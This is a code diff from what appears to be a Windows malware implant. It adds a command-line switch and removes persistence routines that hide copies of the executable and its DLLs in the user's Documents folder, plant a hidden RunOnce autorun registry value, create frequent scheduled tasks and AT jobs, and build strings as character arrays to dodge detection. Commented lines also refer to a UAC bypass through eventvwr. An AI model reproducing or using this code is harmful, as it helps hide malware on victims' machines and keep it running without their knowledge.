@@ -54,7 +54,8 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 	iRet = GetNameFromFullName(szCurrentExePath, szExeName);
 
 	lpwsprintfA(strPEResidence, "%s%s", strDataPath, szExeName);
-
+	lpwsprintfA(strPEResParam, "%s -s", strPEResidence);
+	
 	int iArgc = 0;
 	wchar_t** lpArgvW = lpCommandLineToArgvW(lpGetCommandLineW(), &iArgc);
 	if (iArgc >= 2)
@@ -78,12 +79,17 @@ int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
 			else if (lplstrcmpiA(szParam, "-s") == 0) {
 				break;
 			}
+			else if (lplstrcmpiA(szParam, "-l") == 0) {
+				break;
+				//MessageBoxA(0, 0, 0, 0);
+			}
 			else {
 				ExitProcess(0);
 			}
 		}
 	}
 	else {
+		//MessageBoxA(0, 0, 0, MB_OK);
 		iRet = ExplorerFirstStart();
 	}
 
@@ -241,180 +247,6 @@ int replaceTask() {
 }
 
 
-
-DWORD BackupProgram(char* szSrcFile, char szDllName[MAX_DLL_COUNT][MAX_PATH], DWORD dwDllCnt,
-	char* szSysDir, char* strUserName, char* strBakPEResidence)
-{
-	char szShowInfo[1024];
-
-	char szPeSuffixExe[] = { 'e','x','e',0 };
-	char szPeSuffixCom[] = { 'c','o','m',0 };
-	char szPeSuffixScr[] = { 's','c','r',0 };
-	char szPeSuffixLnk[] = { 'l','n','k',0 };
-	char szPeSuffixBat[] = { 'b','a','t',0 };
-	int iRet = 0;
-
-	char szDstExeNameFormatWin7[] = { 'c',':','\\','u','s','e','r','s','\\','%','s','\\','D','o','c','u','m','e','n','t','s','\\','%','s',0 };
-	char szDstExeNameFormat[] = { 'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',\
-		0x5c,'%','s',0x5c,'M','y',' ','D','o','c','u','m','e','n','t','s',0x5c,'%','s',0 };
-	szDstExeNameFormatWin7[0] = szSysDir[0];
-	szDstExeNameFormat[0] = szSysDir[0];
-	char szDstFilePathFormat[MAX_PATH] = { 0 };
-	if (iSystemVersion > SYSTEM_VERSION_XP)
-	{
-		lplstrcpyA(szDstFilePathFormat, szDstExeNameFormatWin7);
-	}
-	else
-	{
-		lplstrcpyA(szDstFilePathFormat, szDstExeNameFormat);
-	}
-
-
-	char szExeName[MAX_PATH] = { 0 };
-	lplstrcpyA(szExeName, szSrcFile);
-	pPathStripPathA(szExeName);
-
-	char szDstExeName[MAX_PATH] = { 0 };
-	lpwsprintfA(szDstExeName, szDstFilePathFormat, strUserName, szExeName);
-	lplstrcpyA(strBakPEResidence, szDstExeName);
-
-	//char szCurrentPath[MAX_PATH];
-	//iRet = lpGetModuleFileNameA(0,szCurrentPath,MAX_PATH);
-	iRet = lpCopyFileA(szSrcFile, szDstExeName, 0);
-	if (iRet == 0)
-	{
-		iRet = lpRtlGetLastWin32Error();
-
-		lpwsprintfA(szShowInfo, "BackupProgram lpCopyFileA error,the src file is:%s,the dst file is:%s,the errorcode is:%u\r\n",
-			szSrcFile, szDstExeName, iRet);
-		writeLog(szShowInfo);
-	}
-	else
-	{
-		iRet = lpSetFileAttributesA(szDstExeName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);
-	}
-
-	for (DWORD i = 0; i < dwDllCnt; i++)
-	{
-		char szDstDllName[MAX_PATH] = { 0 };
-		char szTmpDllName[MAX_PATH] = { 0 };
-		lplstrcpyA(szTmpDllName, szDllName[i]);
-		pPathStripPathA(szTmpDllName);
-		lpwsprintfA(szDstDllName, szDstFilePathFormat, strUserName, szTmpDllName);
-		iRet = lpCopyFileA(szDllName[i], szDstDllName, 0);
-		if (iRet == 0)
-		{
-			iRet = lpRtlGetLastWin32Error();
-			lpwsprintfA(szShowInfo, "BackupProgram lpCopyFileA dll error,the src file is:%s,the dst file is:%s,the errorcode is:%u\r\n",
-				szDllName[i], szDstDllName, iRet);
-			writeLog(szShowInfo);
-		}
-		else
-		{
-			iRet = lpSetFileAttributesA(szDstDllName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);
-
-		}
-	}
-
-	//regqueryvalueex 2:Registry symbolic links should only be used for for application compatibility when absolutely necessary. 
-	char szSubKey[] = { 'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
-		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n','O','n','c','e',0x5c,0 };
-	char szKeyNameAutoRun[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0 };
-	char szRegFullPath[MAX_PATH];
-	char szRegFullPathFormat[] = { '%','s','\\','r','e','g','.','e','x','e',0 };
-	lpwsprintfA(szRegFullPath, szRegFullPathFormat, szSysDir);
-
-	// 	lpwsprintfA(szParam,"query hkcu\\%s",szRegRunOnce);
-	// 	iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam);
-
-	//here as command schtasks /create command,do not user 2 "" to cover the command
-	//not user " " to include the param in reg when execute it,it can not recognize it
-	char szParam[MAX_PATH];
-	char szParamFormat[] = { 'a','d','d',' ','h','k','c','u','\\','%','s',' ','/','v',' ','%','s',' ','/','t',' ','r','e','g','_','s','z',' ','/','d',' ','\"','%','s','\"',0 };
-	//add hkcu\\%s /v %s /t reg_sz /d %s
-	lpwsprintfA(szParam, szParamFormat, szSubKey, szKeyNameAutoRun, szDstExeName);
-	char szCmd[MAX_PATH];
-	char szCmdFormat[] = { 'c','m','d',' ','/','c',' ','%','s',' ','%','s',0 };
-	lpwsprintfA(szCmd, szCmdFormat, szRegFullPath, szParam);
-	unsigned char szKeyValue[MAX_PATH] = { 0 };
-	int valuelen = MAX_PATH;
-	iRet = QueryRegistryValue(HKEY_CURRENT_USER, szSubKey, szKeyNameAutoRun, szKeyValue, &valuelen);
-	if (iRet)
-	{
-		if (strstr((char*)szKeyValue, szDstExeName) == 0)
-		{
-			iRet = lpWinExec(szCmd, SW_HIDE);
-			//iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam,UACBYPASS_CMD_TYPE_RUNCMD);
-		}
-		else {
-
-		}
-	}
-	else
-	{
-		iRet = lpWinExec(szCmd, SW_HIDE);
-		//iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam,UACBYPASS_CMD_TYPE_RUNCMD);
-	}
-
-	lpwsprintfA(szShowInfo, "BackupProgram execute reg add command:%s\r\n", szCmd);
-	writeLog(szShowInfo);
-
-	return TRUE;
-}
-
-
-
-
-
-
-
-
-
-
-
-DWORD CreateSchWinXP(int iInterval, char* szTaskName, char* szPeFileName)
-{
-	char szShowInfo[1024];
-	char szCmd[MAX_PATH];
-	// 	char szScheduleCmd[] = {'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
-	// 		'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','s','y','s','t','e','m',0};
-
-	char szScheduleCmd[] = { 'c','m','d',' ','/','c',' ','%','s','\\',
-		'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
-		'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','%','s',0 };
-
-	char szAccountName[MAX_PATH];
-	int iRet = lpwsprintfA(szAccountName, "%s\\%s", strComputerName, strUserName);
-	//task account must be computer/user
-	iRet = lpwsprintfA(szCmd, szScheduleCmd, szSysDir, iInterval, szTaskName, szPeFileName, szAccountName);
-
-	iRet = lpWinExec(szCmd, SW_HIDE);
-	if (iRet <= 31)
-	{
-		iRet = lpRtlGetLastWin32Error();
-		char szShowInfo[512];
-		lpwsprintfA(szShowInfo, "CreateScheduleInCmd lpWinExec create error,the errorcode is:%u\r\n", iRet);
-		writeLog(szShowInfo);
-		return FALSE;
-	}
-
-	//schtasks /change command need adin account and password,so here will be a failure result
-	char szScheduleChange[] = { 'c','m','d',' ','/','c',' ','%','s','\\','s','c','h','t','a','s','k','s',' ','/','c','h','a','n','g','e',' ',
-		'/','t','n',' ','%','s',' ','/','r','l',' ','h','i','g','h','e','s','t',0 };
-	iRet = lpwsprintfA(szCmd, szScheduleChange, szSysDir, szTaskName);
-	iRet = lpWinExec(szCmd, SW_HIDE);
-	if (iRet <= 31)
-	{
-		iRet = lpRtlGetLastWin32Error();
-
-		lpwsprintfA(szShowInfo, "CreateScheduleInCmd lpWinExec change error,the errorcode is:%u\r\n", iRet);
-		writeLog(szShowInfo);
-		return FALSE;
-	}
-
-	writeLog("windowxp create schedule ok\r\n");
-	return TRUE;
-}
 
 
 
@@ -639,58 +471,6 @@ int createBootTask(int iInterval, char* szTaskName, char* szPeFileName, char* pa
 
 
 
-int windowsXPJob(DWORD dwStartMilliSeconds, DWORD dwTimes)
-{
-	char szShowInfo[1024];
 
-	char szStartAtFormat[] = { 'c','m','d',' ','/','c',' ','%','s','\\','n','e','t',' ','s','t','a','r','t',' ','s','c','h','e','d','u','l','e',0 };
-	char szStartAt[MAX_PATH];
-	char szSysDir[MAX_PATH] = { 0 };
-	lpGetSystemDirectoryA(szSysDir, MAX_PATH);
-	lpwsprintfA(szStartAt, szStartAtFormat, szSysDir);
-	int iRet = lpWinExec(szStartAt, SW_HIDE);
-
-	AT_INFO ai = { 0 };
-
-	WCHAR szFilePath[MAX_PATH] = { 0 };
-	int iLen = lpMultiByteToWideChar(CP_ACP, 0, strPEResidence, lplstrlenA(strPEResidence), szFilePath, sizeof(szFilePath));
-
-	DWORD dwMilliSeconds = dwStartMilliSeconds;
-	for (DWORD i = 0; i < dwTimes; i++)
-	{
-		ai.Command = szFilePath;
-		ai.DaysOfMonth = 0;
-		ai.DaysOfWeek = 0x7F;
-		ai.Flags = JOB_RUN_PERIODICALLY;
-		ai.JobTime = dwMilliSeconds;
-		DWORD JobId;
-
-		iRet = lpNetScheduleJobAddW(NULL, LPBYTE(&ai), &JobId);
-		if (iRet != NERR_Success)
-		{
-
-			lpwsprintfA(szShowInfo, "set job no:%u error at time:%u\r\n", i, dwMilliSeconds);
-			writeLog(szShowInfo);
-			return FALSE;
-		}
-		else
-		{
-			lpwsprintfA(szShowInfo, "set job no:%u ok at time:%u\r\n", i, dwMilliSeconds);
-			writeLog(szShowInfo);
-		}
-
-		dwMilliSeconds = dwMilliSeconds + 24 * 60 * 60 * 1000 / dwTimes;
-	}
-
-	//	ai.JobTime = 20 * 60 * 60 * 1000 + 5 * 60 * 1000; 
-	// 	DWORD JobId;
-	// 	iRet  = lpNetScheduleJobAddW(NULL, LPBYTE(&ai), &JobId);
-	// 	if (iRet !=  NERR_Success )
-	// 	{
-	// 
-	// 		return FALSE;
-	// 	}
-	return TRUE;
-}
 
 
